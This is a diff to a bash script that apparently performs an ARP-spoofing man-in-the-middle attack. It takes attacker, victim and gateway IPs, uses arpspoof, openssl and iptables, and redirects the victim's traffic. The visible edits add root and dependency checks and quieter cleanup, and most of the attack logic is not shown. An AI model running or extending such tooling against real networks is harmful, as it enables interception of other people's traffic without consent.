@@ -11,6 +11,11 @@ EOF
 
 set -e
 
+if [ "$(id -u)" != "0" ]; then
+    echo "This script must be run as root" 1>&2
+    exit 1
+fi
+
 if [ "$#" -ne 4 ]; then
     cat << EOF
 Usage:
@@ -18,6 +23,13 @@ $0 <INTERFACE> <ATTACKER_IP> <VICTIM_IP> <GATEWAY_IP>
 EOF
     exit 1
 fi
+
+for com in arpspoof openssl iptables ; do
+    command -v "$com" >/dev/null 2>&1 || {
+        echo >&2 "$com required, but it's not installed.  Aborting."
+        exit 1
+    }
+done
 
 IFACE="$1"
 ATTACKER_IP="$2"
@@ -55,8 +67,8 @@ function finish {
     set_iptables_2 D "$VICTIM_IP" "$ATTACKER_IP" "$ORIGINAL_DEST" 2> /dev/null 1>&2
     set_iptables_3 D "$VICTIM_IP" "$ATTACKER_IP" 2> /dev/null 1>&2
     printf "%s" "$IP_FORWARD" > /proc/sys/net/ipv4/ip_forward
-    kill $ARP_PID_1
-    kill $ARP_PID_2
+    kill $ARP_PID_1 2> /dev/null 1>&2
+    kill $ARP_PID_2 2> /dev/null 1>&2
     pkill -P $$
     echo "[*] Done."
 }
